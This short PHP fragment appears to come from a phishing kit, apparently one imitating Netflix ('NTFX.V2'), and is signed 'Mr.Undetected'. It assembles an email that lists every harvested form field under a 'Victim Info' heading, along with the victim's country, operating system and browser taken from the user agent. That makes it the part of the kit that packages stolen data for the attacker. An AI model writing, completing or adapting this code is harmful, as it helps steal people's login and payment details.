...
$headers .= "From: NTFX.V2" . "\r\n";

    $x .= "* Greetings from Mr.Undetected *<br>";
    foreach ($info as $MName => $MValue) 
    {
		$x .= "* $MName : $MValue <br>";       
    }
    $x .= "<b>************ Victim Info ***********<br>";
    $x .= "* From : ".getCountry($info)."<br>";
    $x .= "* OS : ".getpcOS($_SERVER['HTTP_USER_AGENT'])."<br>";
    $x .= "* Browser : ".getpcBrowser($_SERVER['HTTP_USER_AGENT'])."<br>";
    $x .= "********* Mr.Undetected *********<br>";
